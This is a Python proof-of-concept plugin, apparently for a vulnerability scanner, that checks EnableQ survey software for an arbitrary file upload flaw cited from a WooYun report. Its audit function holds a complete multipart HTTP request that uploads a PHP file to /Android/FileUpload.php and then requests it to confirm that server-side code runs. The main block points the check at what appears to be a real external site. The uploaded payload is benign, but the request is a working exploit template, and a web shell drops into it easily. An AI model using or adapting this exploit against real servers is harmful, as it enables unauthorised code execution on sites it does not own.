#!/usr/bin/python
#-*- encoding:utf-8 -*-
# Title EnableQ官方免费版任意文件上传
# Referer http://www.wooyun.org/bugs/wooyun-2010-0128219

def assign(service, arg):
    if service == "enableq":
        return True, arg

def audit(arg):
    raw = """POST /Android/FileUpload.php?optionID=1 HTTP/1.1
Host: xxxxx.com
Content-Length: 316
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 UBrowser/5.5.7386.17 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQXp86Nj8hIcFckX4
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=8ff192ee943f84f5047a44d02f4b453e

------WebKitFormBoundaryQXp86Nj8hIcFckX4
Content-Disposition: form-data; name="uploadedfile_1"; filename="xxx.php"
Content-Type: application/octet-stream

<?php echo md5(1);unlink(__FILE__);?>
------WebKitFormBoundaryQXp86Nj8hIcFckX4
Content-Disposition: form-data; name="button"

提交
------WebKitFormBoundaryQXp86Nj8hIcFckX4--"""
    url = arg + 'Android/FileUpload.php?optionID=1'
    code, head,res, errcode, _ = curl.curl2(url,raw=raw)
    if code == 200 and 'true|1|' in res:
        File = res.replace('true|1|','PerUserData/tmp/')
        url2 = arg + File
        code, head,res, errcode, _ = curl.curl2(url2)
        if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
            security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('enableq', 'http://isurvey.pamri.com/')[1])